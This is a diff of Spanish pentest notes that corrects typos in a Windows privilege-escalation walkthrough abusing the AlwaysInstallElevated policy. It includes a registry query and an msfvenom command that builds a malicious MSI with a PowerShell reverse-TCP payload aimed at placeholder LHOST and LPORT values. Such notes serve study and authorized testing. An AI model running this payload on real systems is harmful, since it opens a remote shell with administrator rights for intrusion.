@@ -10,9 +10,9 @@ reg query HKU\sid\Software\Policies\Microsoft\Windows\installer
 
 Tambien podemos abrir el registry editor y verlo con la interfaz
 
-Vemos que esta hablitada la opcion AlwaysInstallElevated, por lo k todo lo k instalemo, se instalara con privilegios de administrador.
+Vemos que esta hablitada la opcion AlwaysInstallElevated, por lo k todo lo k instalemos, se instalara con privilegios de administrador.
 
-Nos cresmo un msi malicioso:
+Nos creamos un msi malicioso:
     -msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=IP LPORT=PORT -f msi > evil.msi
 
 Y lo ejecutamos:
